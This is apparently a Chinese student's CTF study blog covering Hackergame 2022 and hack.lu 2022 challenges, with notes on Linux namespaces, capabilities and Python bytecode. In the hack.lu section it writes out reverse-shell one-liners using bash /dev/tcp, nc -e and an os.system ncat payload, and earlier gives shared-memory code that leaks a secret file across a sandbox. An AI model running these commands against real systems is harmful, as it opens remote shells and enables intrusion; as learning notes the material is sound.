<p>猫咪问答: 懒得做. 旅行图片: 社工懒得做. 纯耗时间. </p>
<p>签到: mousedown的事件监听的touchStart函数加上一个logpoint让lefttime不变</p>
<p>HeiLang: 无聊的语法转换</p>
<p>Flag自动机: 是window程序, 看了看IDA的反编译代码后发现有消息回调函数, 在cheat engine里让x, y变得不随机, 然后改一个变量进入flag生成. </p>
<h2 id="One-byte-man"><a href="#One-byte-man" class="headerlink" title="One-byte-man"></a>One-byte-man</h2><p>挺神奇的, 代码里面又是还没看的linux概念………</p>
<ul>
<li><p>prctl参数<code>PR_SET_CHILD_SUBREAPER</code>: 设置进程树属性, 使得树中孤儿被收养到最近的<strong>设置了属性的</strong>父进程处.<br>因为该属性<strong>只能通过</strong>execve继承而非fork和clone. </p>
</li>
<li><p>认真看了下namespace的man page. <code>CLONE_NEW*</code>一系列flag.  </p>
</li>
<li><p>user_namespace: A process’s user and group IDs can be different inside and outside a user namespace. </p>
<ul>
<li><p>namespace是一个树状继承图. 像是setns和unshare和clone可以开辟新的子namespace</p>
</li>
<li><p><strong>User and group ID mappings: uid_map and gid_map</strong> </p>
<ul>
<li><blockquote>
<p>假设一个在 User Namespace 中运行的进程尝试以宿主机上的用户身份登录到 FTP 服务器上。由于 FTP 服务器是在宿主机上运行的，因此它无法识别 User Namespace 中的用户和组 ID，从而拒绝了该进程的登录请求(来自gpt), 所以我们需要映射. </p>
</blockquote>
</li>
<li><p>root namespace的两个文件中可以见到<code>0          0 4294967295</code>, 第三个是有符号数的-1, 其实是指一个length, 这一段的uid都被map了. Since Linux 4.15每个进程可有340行映射. </p>
</li>
<li><p>不同namespace的process访问同一个process的uid_map文件可能会产生不同的结果. </p>
</li>
<li><p>因为该行是一个映射, 当访问文件在同一个namespace指<code>内部uid -&gt; 父space uid</code>,<br>当在不同namespace时指<code>内部uid -&gt; 访问进程space uid</code> </p>
</li>
<li><p>写入的程序必须在父space或者同一个space; 被映射的uid在进程space内也必须有map; 有相应的caps.</p>
</li>
</ul>
</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">sudo echo &#x27;0 1000 1\n1000 0 1&#x27; &gt; /proc/121634/uid_map<br></code></pre></div></td></tr></table></figure>

<ul>
<li>The <code>/proc/[pid]/setgroups</code> file<ul>
<li>setgroups() sets the <em><strong><u>supplementary group IDs</u></strong></em> for the calling process.</li>
<li>gid_map没设置以及上面的文件显示”deny”时, 不能用setgroups()</li>
</ul>
</li>
<li>gid_map设置之后(setgroups已确定是否启用)不能通过写入<strong>任何字符</strong>来改变.<br>  进程只能从禁止setgroups(未map)变化到允许setgroups(写入allow)<ul>
<li>在Linux 3.19被加入. 解决了”rwx—rwx”文件的问题. 即换到other user反而提权了, by denying any pathway for an unprivileged process to drop groups with setgroups(2).</li>
</ul>
</li>
<li><code>/proc/sys/kernel/overflowuid</code>: 未map时尝试读取uid会显示的数字. 在uid_map第二个field没有map时也可能显示4294967295.</li>
<li>权限检查时uid会转换到initial user namespace中的uid. </li>
</ul>
</li>
<li><p>capabilities:</p>
<ul>
<li>进程有四个set, 文件有p和i加上一个effective bit.</li>
<li>四个set看了老半天不知道实际是如何操作的, 只有effective和bounding能看明白. bounding应该是个全集, 不过也能够对其进行删减, 意义不明. permitted set应该为该进程允许获得的caps. ambient更是<strong>完全不懂</strong>. </li>
<li>下图是执行execve时cap的变化情况. 注意到当文件effective bit为1时文件的permitted加入了effective set, 这也是一些blog演示ping文件的利用之处, 即<code>cap_net_raw+ep</code>; 这和ambient有啥不同?</li>
</ul>
<img src="../../image/recent_ctf/image-20221026212243834.png" srcset="/img/loading.gif" lazyload alt="image-20221026212243834" style="zoom:80%;" /></li>
<li><p>credentials</p>
<ul>
<li>看到还有个Filesystem user ID and filesystem group ID, 只能说不知道有什么用, 只看到是和supplementary group IDs一起用于判断文件access permissions.</li>
<li>Supplementary group IDs: 一个用户属于一个primary group, 同时又属于多个Supplementary group, 这样就不用切换了, 主要是省事. 在<code>id</code>命令第一个group后面跟着的东西就是. </li>
</ul>
</li>
<li><p><code>capsh getcap setcap getpcaps</code> 和 <code>grep Cap /proc/self/status</code> </p>
</li>
</ul>
<p>pwn.c代码内容: 来自gpt</p>
<blockquote>
<p>这是一个将用户提供的 shellcode 执行在沙箱环境中的程序。用户需要在运行程序时指定一个名为 <code>/chall_env</code> 的文件夹，该文件夹充当着沙箱环境的根目录。在程序启动时，它会先检查是否正确指定了 <code>/chall_env</code> 文件夹，如果没有则会退出。</p>
<p>程序会通过 socketpair 创建一对父子进程间通信的 UNIX 域套接字，然后通过 clone 系统调用创建一个拥有新的命名空间的子进程，并将该子进程的 PID 记录下来。父进程通过设置子进程的 USER namespace、PID namespace、IPC namespace、UTS namespace、NET namespace、CGROUP namespace 和 MOUNT namespace 来限制子进程所能访问的资源，从而阻止子进程破坏主机的安全。在这里，父进程会设定子进程的私有 IPC namespace，这意味着子进程无法和父进程之外的其他进程进行通信。</p>
<p>父进程也会将子进程的 USER namespace 与父进程的 USER namespace 分离开来，从而避免潜在的权限提升和越权访问。有关 namespace 的详细信息可以查看 Linux 的 man page 或者学习相关的容器化技术。</p>
<p>在设置好沙箱后，父进程会等待子进程的准备就绪，之后发送一个 signal 给子进程，唤醒它。子进程会先 chroot 到指定的 <code>/chall_env</code> 文件夹，之后通过 execl 系统调用执行指定的 shell，此时用户可输入 shellcode。该 shell 的缺省 shell 是 busybox。</p>
<p>在子进程中执行 shell 后，父进程将子进程的 UID/GID 映射到自己的 UID/GID 上，防止子进程提权。同时，父进程也会等待子进程结束，如果该子进程执行时间超过了 10 秒，则会通过 SIGALRM 信号切断它的执行。</p>
<p>最后，如果子进程执行了 shellcode，程序会调用 run_shellcode 函数，在指定的 <code>/chall_env</code> 中搜索一个名为 <code>shellcode</code> 的文件，然后将其 mmap 进内存并执行。</p>
<p>整个程序的目的在于创建一个安全隔离的沙箱环境，使得用户可以输入 shellcode 而不影响主机的安全性。同时，程序也有一些安全机制，比如限制子进程的访问权限、映射 UID/GID、限制 shellcode 大小以及设定超时时限等。</p>
</blockquote>
<p>其中的过程有点小错误, 父进程设置完uid gid映射之后才让子进程继续运行, 并没有发送信号而是通过socket传递消息. 但其实绝大部分都是正确的, 和他的速度相比还是非常靠谱. </p>
<p><a target="_blank" rel="noopener" href="https://github.com/USTC-Hackergame/hackergame2022-writeups/tree/master/official/%E5%A3%B9...%E5%A3%B9%E5%AD%97%E8%8A%82%EF%BC%9F">WP</a> </p>
<h2 id="看不见的彼方"><a href="#看不见的彼方" class="headerlink" title="看不见的彼方"></a>看不见的彼方</h2><p>额, 先看rust去了. </p>
<p>题目相关:</p>
<blockquote>
<p>IPC Namespace主要用于隔离进程间通信(IPC)相关的资源，从而保证容器之间的安全隔离。在IPC Namespace中，有一些系统调用的使用受到了限制，包括：</p>
<ol>
<li>msgget, msgsnd, msgrcv：这些系统调用用于创建、发送和接收System V消息队列中的消息，但是在IPC Namespace中，这些操作将被隔离成为单独的命名空间，不同的Namespace之间无法相互传递消息。</li>
<li>semget, semop, semctl：这些系统调用用于创建、操作和控制System V信号量，但是在IPC Namespace中，每个容器只能访问自己的信号量。</li>
<li><strong>shmget, shmat, shmdt, shmctl</strong>：这些系统调用用于创建、映射、卸载和控制System V共享内存，但是在IPC Namespace中，每个容器只能访问自己的共享内存段。</li>
</ol>
<p>除此之外，POSIX消息队列和futex机制也可以被限制在IPC Namespace的范围内。可以通过在创建IPC Namespace时指定需要限制的系统调用来达到这个目的。在一些安全性要求比较高的场景中，这些限制可以有效地保护系统免受潜在的攻击。</p>
</blockquote>
<blockquote>
<p>下次一定问问chatgpt. </p>
</blockquote>
<p>Alice：</p>
<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;sys/shm.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-keyword">void</span> *shm = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-keyword">int</span> shmid = shmget((<span class="hljs-keyword">key_t</span>)<span class="hljs-number">1234</span>, <span class="hljs-number">0x1000</span>, <span class="hljs-number">0666</span>|IPC_CREAT);<br>    <span class="hljs-keyword">if</span> (shmid == <span class="hljs-number">-1</span>)<br>    &#123;<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;shmat failed\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>    shm = shmat(shmid, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (shm == (<span class="hljs-keyword">void</span> *)<span class="hljs-number">-1</span>)<br>    &#123;<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;shmat failed\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br> <br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Memory attached at %p\n&quot;</span>, shm);<br><br>    FILE*f=fopen(<span class="hljs-string">&quot;/secret&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>);<br>    <span class="hljs-built_in">fscanf</span>(f,<span class="hljs-string">&quot;%s&quot;</span>,shm+<span class="hljs-number">8</span>);<br>    *(<span class="hljs-keyword">int</span>*)shm=<span class="hljs-number">1</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure>

<p>Bob：</p>
<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;sys/shm.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-keyword">void</span> *shm = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-keyword">int</span> shmid = shmget((<span class="hljs-keyword">key_t</span>)<span class="hljs-number">1234</span>, <span class="hljs-number">0x1000</span>, <span class="hljs-number">0666</span>|IPC_CREAT);<br>    <span class="hljs-keyword">if</span> (shmid == <span class="hljs-number">-1</span>)<br>    &#123;<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;shmat failed\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>    shm = shmat(shmid, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (shm == (<span class="hljs-keyword">void</span> *)<span class="hljs-number">-1</span>)<br>    &#123;<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;shmat failed\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br> <br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Memory attached at %p\n&quot;</span>, shm);<br>    <span class="hljs-keyword">while</span>(*(<span class="hljs-keyword">int</span>*)shm!=<span class="hljs-number">1</span>);<br>    <span class="hljs-built_in">puts</span>(shm+<span class="hljs-number">8</span>);<br>&#125;<br></code></pre></div></td></tr></table></figure>

<blockquote>
<p>顺便一提即使上了全套 namespace，由于 sysconf 可以查询剩余内存（返回也不会受 mem cgroup 影响），所以也可以拿来做隐蔽信道。来自第一的选手</p>
</blockquote>
<h2 id="传达不到的文件"><a href="#传达不到的文件" class="headerlink" title="传达不到的文件"></a>传达不到的文件</h2><p><a target="_blank" rel="noopener" href="https://github.com/USTC-Hackergame/hackergame2022-writeups/tree/master/official/%E4%BC%A0%E8%BE%BE%E4%B8%8D%E5%88%B0%E7%9A%84%E6%96%87%E4%BB%B6">WP</a> </p>
<h4 id="读不到"><a href="#读不到" class="headerlink" title="读不到"></a>读不到</h4><p>这个题的预期解法是使用 ptrace 单步执行程序，并提取每一步的寄存器，从而理解程序逻辑。之后在 <code>syscall</code> 之前修改 <code>rax</code>（系统调用编号）为 1 (<code>write</code>)，从而泄露整个二进制文件。</p>
<p><a target="_blank" rel="noopener" href="https://github.com/USTC-Hackergame/hackergame2022-writeups/blob/master/official/%E4%BC%A0%E8%BE%BE%E4%B8%8D%E5%88%B0%E7%9A%84%E6%96%87%E4%BB%B6/src/payload/exp_1.c">exp</a> </p>
<h4 id="打不开"><a href="#打不开" class="headerlink" title="打不开"></a>打不开</h4><p>通过分析第一问泄露出的二进制程序，发现和 <code>open</code> 相关的几个 syscall 都被禁止了，独独留下了一个 <code>open</code>。但是这个 open 也是有限制的，只能打开以 “/proc” 开头、不包含 “.” 和 “self” 的路径。由于程序会打印 log 到 “/tmp/log”，所以我们可以通过读 log 得到自己的 PID。</p>
<p>题目的预期考点是 <code>open_tree</code> 这个 syscall，这个 syscall 极少被用到。它能做到以 flag <code>O_PATH</code> 打开一个路径（但是以 <code>O_PATH</code> 打开的文件/目录不能被 read/write）。所以可以先通过 <code>open_tree()</code> 打开 /flag2，之后通过 <code>open()</code> 正常打开 <code>/proc/&lt;pid&gt;/fd/&lt;fd&gt;</code>，这样就能读到 flag2。</p>
<blockquote>
<p><code>O_PATH</code>应用场景可能是打开一个只有执行权限而没有读写权限的文件, 然后使用execl等函数执行<code>/proc/&lt;pid&gt;/fd/&lt;fd&gt;</code>这条路径. </p>
</blockquote>
<p><a target="_blank" rel="noopener" href="https://github.com/USTC-Hackergame/hackergame2022-writeups/blob/master/official/%E4%BC%A0%E8%BE%BE%E4%B8%8D%E5%88%B0%E7%9A%84%E6%96%87%E4%BB%B6/src/payload/exp_2.go">exp</a> : 这怎么是个go文件??说实话这题还没有细看. </p>
<h2 id="光与影"><a href="#光与影" class="headerlink" title="光与影"></a>光与影</h2><p>用到了OpenGL的一些原理, 讲了一堆三角形还有什么图形显示算法, 原理挺复杂, 感觉没必要细究. 但是从别人的解法中还是非预期偏多, 虽然预期解也不复杂. 有从js文件直接提取出显示flag的小球的坐标来当做flag的, 还有修改文件中什么函数的. </p>
<h2 id="杯窗鹅影"><a href="#杯窗鹅影" class="headerlink" title="杯窗鹅影"></a>杯窗鹅影</h2><p><a target="_blank" rel="noopener" href="https://github.com/USTC-Hackergame/hackergame2022-writeups/tree/master/official/%E6%9D%AF%E7%AA%97%E9%B9%85%E5%BD%B1">WP</a> </p>
<p>wine不仅当删除z磁盘映射的时候可以照常read出linux文件系统, 而且也没有对linux的syscall进行拦截. windows程序一般不会直接syscall, 而是交由一个系统库去选取合适的系统调用号. </p>
<p>所以第一问直接读取, 第二问直接将syscall. 当然两问都syscall也是可以的. </p>
<h1 id="hack-lu-2022"><a href="#hack-lu-2022" class="headerlink" title="hack.lu 2022"></a>hack.lu 2022</h1><h2 id="ordersystem"><a href="#ordersystem" class="headerlink" title="ordersystem"></a>ordersystem</h2><h3 id="start"><a href="#start" class="headerlink" title="start"></a>start</h3><p>一眼看到python中<code>socket.socket()</code> 先查一下以前没注意的东西.</p>
<ul>
<li><p><code>setsockopt</code>使用场景: <a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/77023584">link</a> </p>
</li>
<li><p>reuseaddr/reuseport: <a target="_blank" rel="noopener" href="https://www.jianshu.com/p/9cc2b5b9ad4d">查询过程源码</a> <a target="_blank" rel="noopener" href="https://segmentfault.com/a/1190000020524323">reuseport版本演进</a> </p>
</li>
<li><p>bind到 0.0.0.0, 127.0.0.1 localhost 有何<a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/20778771">区别</a> </p>
</li>
<li><p>在docker环境上遇到一点小问题, 重新build了一下. woc为什么链接没反应?? 好吧重启解决问题了. <code>service docker restart</code> </p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/pandana/p/16289320.html">反弹shell</a> </p>
<ul>
<li><p>目标要执行的命令: <code>bash -i &gt;&amp; /dev/tcp/192.168.1.102/7777 0&gt;&amp;1</code>: 将目标主机的bash shell以-i交互式的方式，标准输出+错误输出重定向到192.168.1.102:7777，而在192.168.1.102:7777的标准输入命令会重定向到192.168.1.102:7777的标准输出中）</p>
<p><strong>简言而知，就是将目标主机的标准输入、标准输出、错误输出全都重定向到攻击端上</strong> </p>
</li>
<li><p>上面这种是通过bash命令来反弹shell, 还可以通过<a target="_blank" rel="noopener" href="https://www.hackingtutorials.org/networking/hacking-netcat-part-2-bind-reverse-shells/">python nc perl php命令</a>来reverse.<br><code>nc 192.168.100.113 4444 –e /bin/bash</code> </p>
<p><code>python -c ‘import socket,subprocess,os;................’</code> </p>
</li>
<li><p>而主机要执行<code>nc –lvp 4444</code>命令来监听特定端口号.</p>
</li>
</ul>
</li>
<li><p>python的bytecode真没了解过, 要暴毙了. 这能上哪儿搜. 跟cpython有挺大关系. 又查到了python vm. 又是python的fundamental, 我要疯了怎么又来这么多的东西. 一看就是一星期的量ahhhhhhhhhhhhhhhhhhhhh</p>
</li>
</ul>
<h3 id="Bytecode-relavant"><a href="#Bytecode-relavant" class="headerlink" title="Bytecode relavant:"></a>Bytecode relavant:</h3><p>到处查东西, 写的挺乱的. 还是python innards部分能看一点. </p>
<ul>
<li>python <a target="_blank" rel="noopener" href="https://docs.python.org/3/library/functions.html#__import__">built-in function</a>: the last one is <code>__import__</code>, This function is invoked by import statements. Direct use of <code>__import__()</code> is also discouraged in favor of <code>importlib.import_module()</code> <ul>
<li>e.g. <code>__import__(&#39;os&#39;).system(b&quot;ncat *.*.*.*&quot; &quot;****&quot; &quot;-e /bin/sh&quot;)</code> </li>
</ul>
</li>
<li>ops:<ul>
<li><code>LOAD_FAST</code>(<em>var_num</em>): Pushes a reference to the local <code>co_varnames[var_num]</code> onto the stack. </li>
<li><code>STORE_FAST</code>(<em>var_num</em>): Stores TOS into the local <code>co_varnames[var_num]</code>.</li>
<li><code>RETURN_VALUE</code> Returns with TOS to the caller of the function.</li>
<li><strong>可通过dis.opmap查询inst编码. 想了一小时怎么弄…… 第二个字节是操作数, 就是dis结果的第二个数字</strong>. </li>
<li><code>BUILD_TUPLE</code>(<em>count</em>): Creates a tuple consuming <em><strong>count</strong></em> items from the stack, and <strong>pushes</strong> the resulting tuple.</li>
<li><code>CALL_FUNCTION</code>(<em>argc</em>): <strong>pops all arguments</strong> and the <strong>callable object</strong>, makes call, and <strong>pushes the return value</strong>. <ul>
<li>我真没看出来哪里把参数全部pop出来了……可能是函数内部操作的, switch里call_function后有对stack_pointer的重新赋值.</li>
<li>特别的是比如print函数是没有返回值的, 但此时仍会有值为None的<code>PyObject*</code>被压入栈中.  在本题中令其参数为0个, 可作为None的一种压入方式. </li>
</ul>
</li>
<li><code>LOAD_METHOD</code>(<em>namei</em>): Loads a method named <code>co_names[namei]</code> <strong>from the TOS object</strong>. TOS is <strong>popped</strong>. <ul>
<li>if TOS has a method with the correct name, the bytecode pushes the unbound method and TOS. TOS will be used as the first argument (<code>self</code>) by <a target="_blank" rel="noopener" href="https://docs.python.org/3.10/library/dis.html#opcode-CALL_METHOD"><code>CALL_METHOD</code></a> when calling the unbound method. </li>
<li>Otherwise, <code>NULL</code> and the object return by the attribute lookup are pushed. </li>
</ul>
</li>
<li><code>CALL_METHOD</code><em>(argc)</em> 这个参数显而易见了. <ul>
<li>Positional arguments are on top <strong>+</strong> two items described in <code>LOAD_METHOD</code><br>(either <code>self</code> + an unbound method object <strong>or</strong> <code>NULL</code> + an arbitrary callable)</li>
<li>直接在3.11消失了. 和<code>LOAD_METHOD</code>进行搭配的是<code>PRECALL</code>. 真是每个版本都不一样…. 到时候再看吧. </li>
</ul>
</li>
<li><code>IMPORT_NAME</code>(<em>namei</em>): Imports the module <code>co_names[namei]</code>. TOS and TOS1 are popped and provide the <em>fromlist</em> and <em>level</em> arguments of __import__(). The module object is pushed onto the stack. 实际上TOS1 不需要pop, 只要引用下然后直接修改成返回值即可. <ul>
<li><code>IMPORT_NAME</code>之后通常会<code>STORE_FAST</code>来暂存, 需要调用<code>os.system</code>这样的时候就<code>LOAD_FAST</code>来为<code>LOAD_METHOD</code>获取os module.</li>
<li>还发现了<code>IMPORT_STAR</code> <code>IMPORT_FROM</code>, 前者是从TOS上import所有symbols , 后者是从TOS上import特定, 和上面这个只import module的明显不同. </li>
</ul>
</li>
<li></li>
</ul>
</li>
<li>下面是示例, 在每个CALL_FUNCTION之前都load了函数和参数, 最终操作数为参数的个数(15行的”1”). </li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">In [<span class="hljs-number">1</span>]: <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">test</span>():</span><br>   ...:     <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;test string&quot;</span>)<br><br>In [<span class="hljs-number">2</span>]: <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">test_test</span>():</span><br>   ...:     test()<br>   ...:     <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;test_test string&quot;</span>)<br><br>In [<span class="hljs-number">3</span>]: <span class="hljs-keyword">import</span> dis<br>In [<span class="hljs-number">4</span>]: dis.dis(test_test)<br>  <span class="hljs-number">2</span>           <span class="hljs-number">0</span> LOAD_GLOBAL              <span class="hljs-number">0</span> (test)<br>              <span class="hljs-number">2</span> CALL_FUNCTION            <span class="hljs-number">0</span><br>              <span class="hljs-number">4</span> POP_TOP<br>  <span class="hljs-number">3</span>           <span class="hljs-number">6</span> LOAD_GLOBAL              <span class="hljs-number">1</span> (<span class="hljs-built_in">print</span>)<br>              <span class="hljs-number">8</span> LOAD_CONST               <span class="hljs-number">1</span> (<span class="hljs-string">&#x27;test_test string&#x27;</span>)<br>             <span class="hljs-number">10</span> CALL_FUNCTION            <span class="hljs-number">1</span>                     <br>             <span class="hljs-number">12</span> POP_TOP                                        <br>             <span class="hljs-number">14</span> LOAD_CONST               <span class="hljs-number">0</span> (<span class="hljs-literal">None</span>)              <br>             <span class="hljs-number">16</span> RETURN_VALUE                                   <br></code></pre></div></td></tr></table></figure>

<ul>
<li><del>看了一圈我都不知道什么叫Calls the function in position 7 on the stack with the top three items on the stack as arguments.<br>4 5 6这三个位置就没用了?? 合着原来是填充. 我想我还是看看python innards比较好…..虽然是10年的post<br>然后发现在3.11的文档里是position 4. 啊这? 可能是预留位置防止后来加入东西</del><br>下面是<a target="_blank" rel="noopener" href="https://github.com/python/cpython/blob/main/Python/generated_cases.c.h">cpython源码</a>. main分支上的不在<code>ceval.c</code>中, 因为case语句太长就直接分成一个单独的文件<code>generated_cases.c.h</code>, 其余版本号分支仍在ceval. 已下载cpython 3.11源码, 可以看到一些定义之类的东西.  <ul>
<li>exception below: <a target="_blank" rel="noopener" href="https://docs.python.org/3/c-api/exceptions.html#exception-classes">python doc</a> </li>
<li><code>exc_info()</code>: 没看明白这是个什么东西, 只知道<code>sys.exc_info()</code>有后向兼容性, 现在更多的是使用traceback(?不确定是哪个traceback)</li>
</ul>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">//branch 3.11:</span><br>        TARGET(WITH_EXCEPT_START) &#123;<br>            <span class="hljs-comment">/* At the top of the stack are 4 values:</span><br><span class="hljs-comment">               - TOP = exc_info()</span><br><span class="hljs-comment">               - SECOND = previous exception</span><br><span class="hljs-comment">               - THIRD: lasti of exception in exc_info()</span><br><span class="hljs-comment">               - FOURTH: the context.__exit__ bound method</span><br><span class="hljs-comment">               We call FOURTH(type(TOP), TOP, GetTraceback(TOP)).</span><br><span class="hljs-comment">               Then we push the __exit__ return value.</span><br><span class="hljs-comment">            */</span><br>            PyObject *exit_func;<br>            PyObject *exc, *val, *tb, *res;<br><br>            val = TOP();<br>            assert(val &amp;&amp; PyExceptionInstance_Check(val));<br>            exc = PyExceptionInstance_Class(val);<br>            tb = PyException_GetTraceback(val);<br>            Py_XDECREF(tb);<br>            assert(PyLong_Check(PEEK(<span class="hljs-number">3</span>)));<br>            exit_func = PEEK(<span class="hljs-number">4</span>);<br>            PyObject *<span class="hljs-built_in">stack</span>[<span class="hljs-number">4</span>] = &#123;<span class="hljs-literal">NULL</span>, exc, val, tb&#125;;<br>            res = PyObject_Vectorcall(exit_func, <span class="hljs-built_in">stack</span> + <span class="hljs-number">1</span>,<br>                    <span class="hljs-number">3</span> | PY_VECTORCALL_ARGUMENTS_OFFSET, <span class="hljs-literal">NULL</span>);<br>            <span class="hljs-keyword">if</span> (res == <span class="hljs-literal">NULL</span>)<br>                <span class="hljs-keyword">goto</span> error;<br><br>            PUSH(res);<br>            DISPATCH();<br>        &#125;<br><br><span class="hljs-comment">//but in branch 3.9-10:</span><br>            <span class="hljs-comment">/* At the top of the stack are 7 values:</span><br><span class="hljs-comment">               - (TOP, SECOND, THIRD) = exc_info()</span><br><span class="hljs-comment">               - (FOURTH, FIFTH, SIXTH) = previous exception for EXCEPT_HANDLER</span><br><span class="hljs-comment">               - SEVENTH: the context.__exit__ bound method</span><br><span class="hljs-comment">               We call SEVENTH(TOP, SECOND, THIRD).</span><br><span class="hljs-comment">               Then we push again the TOP exception and the __exit__</span><br><span class="hljs-comment">               return value.</span><br><span class="hljs-comment">            */</span><br></code></pre></div></td></tr></table></figure>

<h3 id="Python-backgrounds-amp-Innards"><a href="#Python-backgrounds-amp-Innards" class="headerlink" title="Python backgrounds &amp; Innards"></a>Python backgrounds &amp; Innards</h3><p>一些太通用的东西挪到这里来了.</p>
<blockquote>
<p>关于python编译系统内部原理的一些链接, 暂时可以不用关注: (不看啥也不知道, 又滚回来看了…</p>
<ul>
<li>stackoverflow: <a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/3299648/python-compilation-interpretation-process">bytecode instance</a> | <a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/19916729/how-exactly-is-python-bytecode-run-in-cpython">theory</a>. 一篇巨长的<a target="_blank" rel="noopener" href="https://towardsdatascience.com/understanding-python-bytecode-e7edaae8734d">文章</a>, 连指令都全部列出来. </li>
<li>Wiki: <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Stack_machine">stack machine</a> vs. register machine<ul>
